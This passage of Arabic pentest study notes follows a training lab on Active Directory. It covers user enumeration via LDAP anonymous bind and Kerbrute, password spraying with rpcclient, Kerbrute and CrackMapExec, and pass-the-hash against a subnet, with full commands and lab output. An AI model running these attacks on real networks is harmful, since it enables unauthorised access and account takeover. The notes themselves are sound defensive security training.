+- إزاي CrackMapExec بيعرض Users بالإضافة إلى badpwdcount و baddpwdtime، وازاي المعلومات دي بتساعدنا نتجنب Lockout قبل تنفيذ Password Spraying.
+
+## Gathering Users with LDAP Anonymous
+
+بعد ما عرفنا إزاي نجيب Users باستخدام SMB NULL Session.
+
+في طريقة تانية اسمها:
+
+**LDAP Anonymous Bind**
+
+ودي بتعتمد على إن السيرفر يسمح لأي شخص يعمل Query على الـ LDAP بدون Username أو Password.
+
+---
+
+## يعني إيه LDAP؟
+
+LDAP اختصار:
+
+**Lightweight Directory Access Protocol**
+
+وده البروتوكول اللي Active Directory بيستخدمه علشان يخزن ويسترجع معلومات عن:
+
+- Users
+- Groups
+- Computers
+- Organizational Units (OU)
+- Password Policies
+
+بمعنى إن أي عملية بحث داخل الـ Active Directory غالبًا بتتم باستخدام LDAP.
+
+---
+
+## يعني إيه Anonymous Bind؟
+
+كلمة Bind في LDAP معناها:
+
+"تعمل Login أو Connection مع السيرفر."
+
+لكن هنا Anonymous Bind يعني:
+
+تعمل اتصال **بدون Authentication**.
+
+يعني:
+
+- Username = فارغ
+- Password = فارغ
+
+لو السيرفر سمح بده، تقدر تقرأ بيانات كتير من الـ Active Directory.
+
+---
+
+## الأدوات المستخدمة
+
+الدرس ذكر أداتين:
+
+- ldapsearch
+- windapsearch
+
+---
+
+## ldapsearch
+
+الأمر:
+
+```bash
+ldapsearch \
+-h 172.16.5.5 \
+-x \
+-b "DC=INLANEFREIGHT,DC=LOCAL" \
+-s sub \
+"(&(objectclass=user))"
+```
+
+---
+
+## نشرح الأمر بالكامل
+
+### ldapsearch
+
+أداة موجودة غالبًا في Linux.
+
+بتستخدم لإرسال استعلامات (Queries) إلى LDAP Server.
+
+---
+
+### -h
+
+```bash
+-h 172.16.5.5
+```
+
+يعني:
+
+عنوان الـ Domain Controller.
+
+---
+
+### -x
+
+يعني:
+
+استخدم Simple Authentication.
+
+وفي الحالة دي بما إننا مش مديين Username أو Password.
+
+يبقى هيحاول يعمل Anonymous Bind.
+
+---
+
+### -b
+
+```bash
+-b "DC=INLANEFREIGHT,DC=LOCAL"
+```
+
+دي اسمها:
+
+**Base DN**
+
+---
+
+## يعني إيه Base DN؟
+
+هي النقطة اللي هيبدأ منها البحث.
+
+لو الدومين:
+
+```
+INLANEFREIGHT.LOCAL
+```
+
+يبقى الـ Base DN بيكون:
+
+```
+DC=INLANEFREIGHT,DC=LOCAL
+```
+
+---
+
+### -s sub
+
+اختصار:
+
+Subtree.
+
+يعني:
+
+ابحث في كل الفروع.
+
+مش في الـ Root بس.
+
+---
+
+### "(&(objectclass=user))"
+
+ده اسمه:
+
+LDAP Search Filter.
+
+---
+
+## يعني إيه Search Filter؟
+
+هو الشرط اللي بقوله للسيرفر.
+
+هنا الشرط هو:
+
+```
+هات أي Object
+نوعه User
+```
+
+يعني متجبليش:
+
+- Groups
+- Computers
+- Printers
+
+هات المستخدمين فقط.
+
+---
+
+## بعد كده
+
+الأمر بيستخدم
+
+```bash
+grep
+```
+
+---
+
+```bash
+grep sAMAccountName:
+```
+
+---
+
+## sAMAccountName
+
+ده أهم Attribute خاص باليوزر.
+
+وهو الـ Username.
+
+مثلاً:
+
+```
+Administrator
+
+Ahmed
+
+Mohab
+```
+
+---
+
+بعدها
+
+```bash
+cut
+```
+
+علشان يطلع اسم المستخدم فقط.
+
+---
+
+## الناتج
+
+```text
+guest
+
+ACADEMY-EA-DC01$
+
+ACADEMY-EA-MS01$
+
+ACADEMY-EA-WEB01$
+
+htb-student
+
+avazquez
+```
+
+---
+
+## ليه فيه أسماء بتنتهي بـ $
+
+زي:
+
+```
+ACADEMY-EA-DC01$
+```
+
+دي مش Users.
+
+دي Computer Accounts.
+
+---
+
+في Active Directory.
+
+كل جهاز ليه Account.
+
+وبيكون آخره علامة:
+
+```
+$
+```
+
+زي:
+
+```
+PC01$
+
+SERVER01$
+
+WEB01$
+```
+
+---
+
+## windapsearch
+
+الدرس قال إن استخدام ldapsearch محتاج تعرف LDAP Filters.
+
+لكن windapsearch أسهل.
+
+---
+
+الأمر
+
+```bash
+./windapsearch.py \
+--dc-ip 172.16.5.5 \
+-u "" \
+-U
+```
+
+---
+
+## نشرح
+
+### --dc-ip
+
+IP بتاع الـ Domain Controller.
+
+---
+
+### -u ""
+
+Username فارغ.
+
+علشان Anonymous Bind.
+
+---
+
+### -U
+
+يعني:
+
+اعرض المستخدمين فقط.
+
+Users Only.
+
+---
+
+## الناتج
+
+```text
+Attempting bind
+
+success!
+```
+
+---
+
+وده معناه
+
+إن Anonymous Bind اشتغل.
+
+---
+
+بعدها
+
+```text
+Enumerating all AD users
+```
+
+يعني:
+
+هيبدأ يجيب كل المستخدمين.
+
+---
+
+مثلاً
+
+```text
+cn: Annie Vazquez
+```
+
+---
+
+## cn
+
+اختصار:
+
+Common Name.
+
+وده الاسم الكامل.
+
+---
+
+بعدها
+
+```text
+userPrincipalName
+```
+
+---
+
+## userPrincipalName
+
+ده اسم المستخدم الكامل.
+
+مثلاً
+
+```
+avazquez@inlanefreight.local
+```
+
+وده غالبًا بيستخدم أثناء تسجيل الدخول.
+
+---
+
+## Enumerating Users with Kerbrute
+
+دلوقتي نفترض إن:
+
+- مفيش NULL Session.
+- مفيش LDAP Anonymous.
+- معندكش Credentials.
+
+نعمل إيه؟
+
+---
+
+هنا بنستخدم:
+
+Kerbrute.
+
+---
+
+## Kerbrute
+
+أداة بتستخدم بروتوكول:
+
+Kerberos.
+
+علشان تعرف إذا كان Username موجود ولا لأ.
+
+---
+
+## أهم ميزة
+
+إنها أسرع جدًا.
+
+وكمان أقل ضوضاء (Stealthier).
+
+---
+
+## ليه؟
+
+لأنها مش بتحاول تعمل Login بالطريقة التقليدية.
+
+---
+
+هي بتبعت
+
+TGT Request
+
+للـ KDC.
+
+---
+
+## يعني إيه TGT؟
+
+TGT اختصار:
+
+**Ticket Granting Ticket**
+
+وده أول Ticket المستخدم بياخده لما يعمل Login باستخدام Kerberos.
+
+---
+
+## KDC
+
+اختصار:
+
+Key Distribution Center.
+
+وده جزء من الـ Domain Controller مسؤول عن Kerberos Authentication.
+
+---
+
+## Kerberos Pre-Authentication
+
+الدرس ذكر نقطة مهمة جدًا.
+
+Kerbrute بيبعت طلب بدون Pre-Authentication.
+
+---
+
+لو الـ KDC رد:
+
+```
+PRINCIPAL UNKNOWN
+```
+
+يبقى
+
+الـ Username غير موجود.
+
+---
+
+أما لو قال:
+
+```
+هات Kerberos Pre-Authentication
+```
+
+يبقى
+
+اليوزر موجود.
+
+---
+
+## ليه الطريقة دي مميزة؟
+
+لأنها:
+
+لا تعتبر Login Failure.
+
+وبالتالي
+
+مش بتطلع Event ID
+
+```
+4625
+```
+
+---
+
+## Event ID 4625
+
+ده Event بيتسجل لما:
+
+حد يحاول يعمل Login ويفشل.
+
+وده الـ SOC أو الـ SIEM بيراقبه غالبًا.
+
+---
+
+## لكن هل Kerbrute Invisible؟
+
+لا.
+
+---
+
+هو بيطلع Event مختلف.
+
+اسمه
+
+```
+4768
+```
+
+---
+
+## Event ID 4768
+
+يعني:
+
+تم طلب Ticket من Kerberos.
+
+---
+
+وده بيظهر فقط.
+
+لو الشركة مفعلة:
+
+Kerberos Logging.
+
+---
+
+## الأمر
+
+```bash
+kerbrute userenum \
+-d inlanefreight.local \
+--dc 172.16.5.5 \
+/opt/jsmith.txt
+```
+
+---
+
+## نشرح
+
+### userenum
+
+يعني:
+
+اعمل Username Enumeration.
+
+---
+
+### -d
+
+اسم الدومين.
+
+---
+
+### --dc
+
+IP بتاع الـ Domain Controller.
+
+---
+
+### /opt/jsmith.txt
+
+Wordlist.
+
+فيها آلاف الـ Usernames المحتملة.
+
+---
+
+## الناتج
+
+```text
+VALID USERNAME:
+
+jjones
+
+sbrown
+
+tjohnson
+```
+
+---
+
+يعني
+
+كل دول موجودين داخل الـ Active Directory.
+
+---
+
+## سرعة Kerbrute
+
+الدرس ذكر مثال.
+
+فحص:
+
+```
+48,705 Username
+```
+
+في حوالي:
+
+```
+12 ثانية
+```
+
+وده سريع جدًا.
+
+---
+
+## هل الطريقة دي بتقفل الحسابات؟
+
+أثناء Username Enumeration
+
+لا.
+
+---
+
+لكن
+
+لو استخدمت Kerbrute بعد كده في Password Spraying.
+
+يبقى أي Password غلط.
+
+هيتحسب ضمن:
+
+```
+badpwdcount
+```
+
+وممكن يقفل الحساب.
+
+---
+
+## لو معرفتش تجيب Users بأي طريقة؟
+
+الكاتب قال.
+
+ارجع لـ OSINT.
+
+---
+
+زي:
+
+- LinkedIn
+- Email Harvesting
+- أسماء الموظفين على الموقع الرسمي
+- أدوات مثل linkedin2username لتوليد أسماء مستخدمين محتملة بناءً على أسماء الموظفين.
+
+---
+
+## Credentialed Enumeration
+
+لو معاك Username و Password صحيحين.
+
+يبقى الموضوع أسهل بكتير.
+
+---
+
+الأمر:
+
+```bash
+crackmapexec smb 172.16.5.5 \
+-u htb-student \
+-p Academy_student_AD! \
+--users
+```
+
+---
+
+## الفرق بينه وبين اللي فات
+
+المرة اللي فاتت استخدمنا:
+
+```
+--users
+```
+
+بدون Credentials.
+
+---
+
+المرة دي
+
+بنستخدم User حقيقي.
+
+---
+
+وده بيدينا معلومات أدق.
+
+زي:
+
+```text
+badpwdcount
+```
+
+---
+
+و
+
+```text
+baddpwdtime
+```
+
+لكل User.
+
+---
+
+مثلاً
+
+```text
+avazquez
+
+badpwdcount : 20
+```
+
+---
+
+وده معناه.
+
+المستخدم غلط 20 مرة.
+
+---
+
+ولو الـ Lockout Threshold
+
+5
+
+يبقى ده حساب لازم تتجنبه تمامًا أثناء الـ Password Spraying، لأن أي محاولة إضافية قد تؤدي إلى قفله إذا كانت العداد لم يتم إعادة تعيينه وفقًا للـ Password Policy.
+
+---
+
+## ملخص الجزء
+
+بعد الجزء ده بقينا نعرف:
+
+- إزاي نستخدم LDAP Anonymous Bind لجمع المستخدمين.
+- الفرق بين ldapsearch و windapsearch.
+- معنى Base DN و LDAP Search Filter و sAMAccountName.
+- ليه Computer Accounts بتنتهي بعلامة `$`.
+- إزاي Kerbrute بيكتشف اليوزرز باستخدام Kerberos.
+- الفرق بين Event ID 4625 و Event ID 4768.
+- إمتى Kerbrute آمن، وإمتى ممكن يسبب Account Lockout.
+- إزاي نستخدم CrackMapExec مع Credentials للحصول على قائمة مستخدمين ومعلومات تساعدنا قبل تنفيذ Password Spraying.
+
+# Layer 11
+## Internal Password Spraying - from Linux
+
+بعد ما جمعنا:
+
+- قائمة المستخدمين (User List)
+- وعرفنا الـ Password Policy
+
+يبقى جاهزين ننفذ **Password Spraying**.
+
+الدرس هنا بيشرح إزاي تعمل الهجوم من جهاز Linux.
+
+---
+
+## يعني إيه Internal Password Spraying؟
+
+يعني أنت بالفعل موجود داخل شبكة الشركة.
+
+مش بتهاجم من الإنترنت.
+
+يعني مثلاً:
+
+- على جهاز Kali داخل الشركة.
+- أو واخد Shell على جهاز Linux.
+- أو داخل VPN الخاصة بالشركة.
+
+ومن هناك تبدأ تجرب Password واحد على كل المستخدمين.
+
+---
+
+## ليه لازم نمشي بحذر؟
+
+الكاتب أكد على النقطة دي.
+
+لأن أي Password غلط بيتحسب.
+
+ولو عديت الـ Lockout Threshold.
+
+الحسابات هتتقفل.
+
+وده:
+
+- هيكشف وجودك.
+- وهيعمل مشاكل للعميل.
+- وهيعتبر تنفيذ سيء للـ Pentest.
+
+---
+
+## Password Spraying باستخدام rpcclient
+
+الكاتب بيقول إن rpcclient يعتبر من أفضل الأدوات لتنفيذ Password Spraying من Linux.
+
+---
+
+## المشكلة في rpcclient
+
+لما الـ Login ينجح.
+
+مش بيقولك:
+
+```
+SUCCESS
+```
+
+مثلاً.
+
+لا.
+
+بيطلع Output عادي.
+
+فلازم تعرف إيه العلامة اللي تدل إن الـ Login نجح.
+
+---
+
+## علامة نجاح الـ Login
+
+لو ظهر:
+
+```text
+Authority Name
+```
+
+يبقى Authentication نجح.
+
+---
+
+## الأمر
+
+```bash
+for u in $(cat valid_users.txt); do
+rpcclient -U "$u%Welcome1" \
+-c "getusername;quit" \
+172.16.5.5 | grep Authority;
+done
+```
+
+---
+
+## نشرح الأمر بالكامل
+
+---
+
+### for
+
+```bash
+for u
+```
+
+دي Loop.
+
+هتلف على كل User.
+
+---
+
+### $(cat valid_users.txt)
+
+يعني:
+
+اقرأ الملف.
+
+مثلاً
+
+```
+ahmed
+
+mohab
+
+admin
+
+john
+```
+
+---
+
+كل سطر.
+
+هيتحط في المتغير:
+
+```
+u
+```
+
+---
+
+### rpcclient
+
+الأداة اللي هتعمل Authentication.
+
+---
+
+### -U
+
+```bash
+-U "$u%Welcome1"
+```
+
+دي أهم جزء.
+
+---
+
+لاحظ الشكل.
+
+```
+Username%Password
+```
+
+يعني
+
+```
+ahmed%Welcome1
+```
+
+---
+
+ثم
+
+```
+mohab%Welcome1
+```
+
+---
+
+ثم
+
+```
+admin%Welcome1
+```
+
+وهكذا.
+
+---
+
+### -c
+
+```bash
+-c
+```
+
+يعني:
+
+نفذ Command.
+
+وبعدين اقفل.
+
+---
+
+### getusername
+
+بعد الـ Login.
+
+اسأل السيرفر:
+
+مين اليوزر الحالي؟
+
+---
+
+لو الـ Login نجح.
+
+هيرجع:
+
+اسم المستخدم.
+
+---
+
+### quit
+
+اقفل الاتصال.
+
+---
+
+### grep Authority
+
+فلترة.
+
+يعني:
+
+هات السطور اللي فيها
+
+```
+Authority
+```
+
+بس.
+
+---
+
+## الناتج
+
+```text
+Account Name: tjohnson
+
+Authority Name: INLANEFREIGHT
+```
+
+---
+
+وده معناه.
+
+إن Login نجح.
+
+---
+
+لو مفيش Output.
+
+يبقى Password غلط.
+
+---
+
+## ليه grep مهم؟
+
+بدونه.
+
+هتشوف مئات الرسائل.
+
+وممكن تضيع الـ Success وسطها.
+
+---
+
+## Password Spraying باستخدام Kerbrute
+
+الأداة التانية.
+
+هي Kerbrute.
+
+---
+
+## الأمر
+
+```bash
+kerbrute passwordspray \
+-d inlanefreight.local \
+--dc 172.16.5.5 \
+valid_users.txt \
+Welcome1
+```
+
+---
+
+## نشرح
+
+### passwordspray
+
+يعني:
+
+نفذ Password Spraying.
+
+---
+
+### -d
+
+اسم الدومين.
+
+---
+
+### --dc
+
+IP بتاع الـ Domain Controller.
+
+---
+
+### valid_users.txt
+
+ملف المستخدمين.
+
+---
+
+### Welcome1
+
+الباسورد اللي هيتجرب.
+
+---
+
+## الناتج
+
+```text
+VALID LOGIN
+
+sgage
+
+Welcome1
+```
+
+---
+
+وده معناه.
+
+اليوزر:
+
+```
+sgage
+```
+
+بيستخدم
+
+```
+Welcome1
+```
+
+---
+
+بعدها
+
+```text
+Done!
+```
+
+---
+
+وبيوضح:
+
+- عدد الـ Logins.
+- عدد النجاحات.
+- الوقت.
+
+---
+
+## CrackMapExec Password Spraying
+
+طريقة تالتة.
+
+---
+
+الأمر
+
+```bash
+sudo crackmapexec smb \
+172.16.5.5 \
+-u valid_users.txt \
+-p Password123
+```
+
+---
+
+## نشرح
+
+### smb
+
+هنجرب Authentication باستخدام SMB.
+
+---
+
+### -u
+
+بدل User واحد.
+
+اديناله File.
+
+---
+
+كل User.
+
+هيتجرب عليه Password واحدة.
+
+---
+
+### -p
+
+الباسورد.
+
+---
+
+## grep +
+
+بعدها
+
+```bash
+grep +
+```
+
+---
+
+ليه؟
+
+لأن CrackMapExec بيطلع Output لكل User.
+
+---
+
+لكن.
+
+الـ Success.
+
+بيكون فيه
+
+```
+[+]
+```
+
+---
+
+فالفلترة دي.
+
+بتطلع النجاحات فقط.
+
+---
+
+## الناتج
+
+```text
+[+]
+
+avazquez
+
+Password123
+```
+
+---
+
+وده معناه.
+
+اليوزر.
+
+Password بتاعه صحيحة.
+
+---
+
+## التحقق من الـ Credentials
+
+بعد ما تلاقي Password صحيحة.
+
+لا تعتمد على نتيجة الـ Spray فقط.
+
+---
+
+اعمل Validation.
+
+---
+
+الأمر
+
+```bash
+crackmapexec smb \
+172.16.5.5 \
+-u avazquez \
+-p Password123
+```
+
+---
+
+## الهدف
+
+نتأكد إن:
+
+- Username صحيح.
+- Password صحيحة.
+- Authentication شغال.
+
+---
+
+لو ظهر
+
+```text
+[+]
+```
+
+يبقى Credentials صحيحة.
+
+---
+
+## Local Administrator Password Reuse
+
+الدرس بعد كده دخل في نقطة مهمة جدًا.
+
+---
+
+## هل Password Spraying بيكون على Domain Users فقط؟
+
+لا.
+
+---
+
+ممكن كمان.
+
+تجربه على:
+
+Local Administrator.
+
+---
+
+## يعني إيه Local Administrator؟
+
+كل جهاز Windows.
+
+فيه Administrator خاص بيه.
+
+---
+
+وده مختلف عن:
+
+```
+Domain Administrator
+```
+
+---
+
+## المشكلة الكبيرة
+
+شركات كتير.
+
+بتستخدم نفس Password.
+
+على كل الأجهزة.
+
+---
+
+مثلاً.
+
+كل الأجهزة.
+
+Password بتاع الـ Administrator فيها
+
+```
+Admin@123
+```
+
+---
+
+لو عرفت Password جهاز واحد.
+
+يبقى غالبًا.
+
+هتدخل باقي الأجهزة.
+
+---
+
+## ليه المشكلة دي موجودة؟
+
+بسبب
+
+Gold Images.
+
+---
+
+## يعني إيه Gold Image؟
+
+هي نسخة Windows جاهزة.
+
+الشركة بتعمل منها Clone.
+
+على كل الأجهزة.
+
+---
+
+لو النسخة فيها:
+
+```
+Administrator
+
+Password123
+```
+
+---
+
+يبقى كل الأجهزة.
+
+هيكون فيها نفس Password.
+
+---
+
+## CrackMapExec
+
+بيقدر يجرب نفس الـ Password.
+
+على كل الأجهزة.
+
+---
+
+## الأجهزة المهمة
+
+الكاتب قال.
+
+ركز على:
+
+- SQL Servers
+- Exchange Servers
+
+---
+
+## ليه؟
+
+لأن غالبًا.
+
+هيكون عليهم:
+
+- Admins.
+- Service Accounts.
+- Credentials في الذاكرة.
+
+---
+
+## إعادة استخدام Passwords
+
+مثلاً.
+
+لقيت
+
+```
+desktop%@admin123
+```
+
+على جهاز Desktop.
+
+---
+
+جرب
+
+```
+server%@admin123
+```
+
+على السيرفرات.
+
+---
+
+لأن الشركات أحيانًا بتغير جزء بسيط فقط من كلمة السر حسب نوع الجهاز.
+
+---
+
+## نفس الفكرة مع المستخدمين
+
+مثلاً.
+
+عرفت Password المستخدم:
+
+```
+ajones
+```
+
+---
+
+جربها على:
+
+```
+ajones_adm
+```
+
+---
+
+لأن بعض الشركات بتدي نفس الشخص:
+
+- User Account
+- Admin Account
+
+بنفس Password.
+
+---
+
+## Domain Trust
+
+ممكن كمان.
+
+يبقى فيه:
+
+Domain A
+
+و
+
+Domain B
+
+---
+
+ونفس المستخدم.
+
+بيستخدم نفس Password.
+
+في الاتنين.
+
+---
+
+## NTLM Hash
+
+أحيانًا.
+
+مش هتعرف Password.
+
+---
+
+لكن هتعرف:
+
+NTLM Hash.
+
+---
+
+## يعني إيه NTLM Hash؟
+
+هو تمثيل مشفر (Hash) لكلمة المرور، ويُستخدم في بعض بروتوكولات المصادقة داخل Windows. بعض الأدوات تستطيع استخدام الـ Hash مباشرة للمصادقة في سيناريوهات معينة بدون معرفة كلمة المرور الأصلية.
+
+---
+
+## الأمر
+
+```bash
+sudo crackmapexec smb \
+--local-auth \
+172.16.5.0/23 \
+-u administrator \
+-H 88ad09182de639ccc6579eb0849751cf
+```
+
+---
+
+## نشرح
+
+### --local-auth
+
+مهمة جدًا.
+
+---
+
+بتقول لـ CrackMapExec.
+
+متستخدمش Domain Authentication.
+
+---
+
+استخدم Local Accounts فقط.
+
+---
+
+وده بيمنع.
+
+إنه يجرب على الدومين.
+
+وبالتالي يقلل خطر قفل حساب Domain Administrator.
+
+---
+
+### 172.16.5.0/23
+
+Network كاملة.
+
+---
+
+يعني.
+
+جرب على كل الأجهزة.
+
+---
+
+### -u administrator
+
+اليوزر المحلي.
+
+---
+
+### -H
+
+بدل Password.
+
+بنستخدم NTLM Hash.
+
+---
+
+## الناتج
+
+```text
+(Pwn3d!)
+```
+
+---
+
+## يعني إيه Pwn3d! ؟
+
+دي رسالة من CrackMapExec.
+
+معناها:
+
+تم تسجيل الدخول بنجاح.
+
+والحساب عنده صلاحيات Administrator على الجهاز.
+
+---
+
+## بعد كده نعمل إيه؟
+
+نبدأ نفحص الأجهزة.
+
+يمكن نلاقي:
+
+- Credentials.
+- ملفات مهمة.
+- Session لـ Domain Admin.
+- أو أي وسيلة تساعدنا نوصل للدومين.
+
+---
+
+## هل الطريقة دي Stealth؟
+
+لا.
+
+---
+
+الكاتب قال.
+
+الطريقة دي:
+
+**Noisy جدًا.**
+
+---
+
+يعني هتعمل كمية كبيرة من محاولات الاتصال على أجهزة كثيرة، وده ممكن يكون ملحوظ في الـ Logs وأنظمة المراقبة.
+
+---
+
+## علاج المشكلة
+
+الكاتب اقترح استخدام:
+
+**LAPS (Local Administrator Password Solution).**
+
+---
+
+## يعني إيه LAPS؟
+
+أداة مجانية من Microsoft.
+
+بتخلي:
+
+كل جهاز.
+
+له Password مختلفة للـ Local Administrator.
+
+---
+
+وكمان.
+
+بتغيرها تلقائيًا كل فترة.
+
+---
+
+وبالتالي.
+
+حتى لو عرفت Password جهاز.
+
+مش هتدخل أي جهاز تاني.
+
+---
+
+## ملخص الجزء
+
+بعد الجزء ده بقينا نعرف:
+
+- إزاي ننفذ Password Spraying من Linux باستخدام `rpcclient`.
+- ليه `Authority Name` دليل على نجاح تسجيل الدخول.
+- إزاي نستخدم `Kerbrute` في Password Spraying.
+- إزاي نستخدم `CrackMapExec` لتنفيذ الهجوم والتحقق من الـ Credentials.
+- يعني إيه Local Administrator Password Reuse وليه يعتبر خطر.
+- الفرق بين استخدام Password عادية واستخدام NTLM Hash.
+- أهمية `--local-auth` عند تجربة Local Administrator.
+- معنى رسالة `Pwn3d!`.
+- ليه إعادة استخدام كلمات مرور الـ Local Administrator مشكلة كبيرة، وإزاي LAPS بيعالجها.
+
+# Layer 12
